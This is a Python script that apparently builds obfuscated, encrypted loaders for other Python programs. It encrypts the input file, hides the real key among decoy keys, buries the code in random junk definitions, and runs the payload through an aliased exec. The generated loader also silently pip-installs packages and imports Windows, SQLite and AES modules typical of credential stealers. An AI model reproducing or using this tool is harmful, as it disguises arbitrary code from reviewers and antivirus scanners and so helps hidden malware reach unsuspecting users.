import random
import os
import subprocess
import base64
import zlib
import argparse
import string
import logging
from cryptography.fernet import Fernet

BUILD_PATH = "./build"
ENCRYPTION_KEY_FILE = "encryption_key.txt"
logging.basicConfig(level=logging.INFO)

def generate_random_string(length=200, chars=string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_code(num_vars=200, num_funcs=200, num_classes=200):
    fake_code = [f"{generate_random_string()} = {repr(random.randint(1000000, 100000000))}" for _ in range(num_vars)]
    
    def get_user_info():
        return {'username': generate_random_string(200), 'age': random.randint(18, 99)}
    
    def get_channel_name():
        return repr(generate_random_string())
    
    def get_repos():
        return [repr(generate_random_string()) for _ in range(random.randint(1, 5))]
    
    fake_functions = [get_user_info, get_channel_name, get_repos]
    fake_classes = [
        f"class {generate_random_string()}:\n    def __init__(self):\n        self.data = {repr(random.choice([True, False]))}\n    def get_data(self):\n        return self.data"
        for _ in range(num_classes)
    ]
    all_code = fake_code + fake_functions + fake_classes
    all_code = [str(item()) if callable(item) else str(item) for item in all_code]
    all_code = random.sample(all_code, len(all_code))
    return "\n".join(all_code)

def encrypt_code(code, key):
    return base64.b64encode(Fernet(key).encrypt(zlib.compress(code.encode('utf-8')))).decode('utf-8')

def random_class_name():
    return ''.join(random.choice(string.ascii_letters) + random.choice(string.ascii_letters + string.digits) for _ in range(19))

def main():
    parser = argparse.ArgumentParser(description='Obfuscate and create an executable.')
    parser.add_argument('file', help='Path to the source file to obfuscate')
    args = parser.parse_args()
    
    os.makedirs(BUILD_PATH, exist_ok=True)

    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)

    with open(args.file, "rb") as code_file:
        code = code_file.read()

    encoded_code = encrypt_code(code.decode('utf-8'), key)
    all_fake_code = generate_fake_code()
    a = random_class_name()
    e = random_class_name()
    
    def generate_random_keys(num_keys):
        keys = [Fernet.generate_key() for _ in range(num_keys)]
        return keys

    key_list = []
    key_list.extend(generate_random_keys(random.randint(10, 25)))
    keyssss = random.randint(0, len(key_list))
    key_list.insert(keyssss, key)

    obfuscated_code = f"""
import aiohttp, psutil, win32api
import time
{all_fake_code}
import zlib, os, platform
import base64
{all_fake_code}
from sys import executable, stderr
import xml.etree.ElementTree as ET

try:
    import aiohttp, psutil, win32api
except ImportError:
    subprocess.run('python -m pip install aiohttp psutil pywin32', shell=True)
    import aiohttp, psutil, win32api

try:
    import cryptography
except ImportError:
    subprocess.run('python -m pip install cryptography', shell=True)
    from cryptography.fernet import Fernet

import subprocess
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install " + modl[1], shell=True)
        time.sleep(3)

import requests

from cryptography.fernet import Fernet as {a}

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome", shell=True)
    from Crypto.Cipher import AES

encoded_code = "{encoded_code}"
{e} = exec
encrypted_code = base64.b64decode(encoded_code)
{all_fake_code}
s = {key_list}
for key in s:
    try:
        decrypted_code = {a}(key.decode("utf-8")).decrypt(encrypted_code)
        break
    except Exception as e:
        pass
{all_fake_code}
decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
{e}(decompressed_code)
{all_fake_code}
"""
    
    name = os.path.basename(args.file).replace('.py', '') + '_obfuscated.py'
    s = base64.b64encode(obfuscated_code.encode('utf-8'))
    aw = random_class_name()    
    with open(f'{BUILD_PATH}/{name}', "w+") as obfu_file:
        obfu_file.write(f'''
from sys import executable, stderr
{all_fake_code}
import os
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time, platform
from importlib import import_module
import aiohttp, psutil, win32api
import xml.etree.ElementTree as ET


try:
    import aiohttp, psutil, win32api
except ImportError:
    subprocess.run('python -m pip install aiohttp psutil pywin32', shell=True)
    import aiohttp, psutil, win32api

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install " + modl[1], shell=True)
        time.sleep(3)

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES
    



import requests
{all_fake_code}
{e} = exec
{all_fake_code}
import concurrent.futures
{aw}="{s.decode("utf-8")}"
{e}(base64.b64decode({aw}))
{all_fake_code}''') 

    obfuscated_file_path = os.path.join(BUILD_PATH, f"{name}")
    os.remove(ENCRYPTION_KEY_FILE)
    logging.info(f"The code has been encrypted, Filename: {obfuscated_file_path}")

if __name__ == "__main__":
    main()
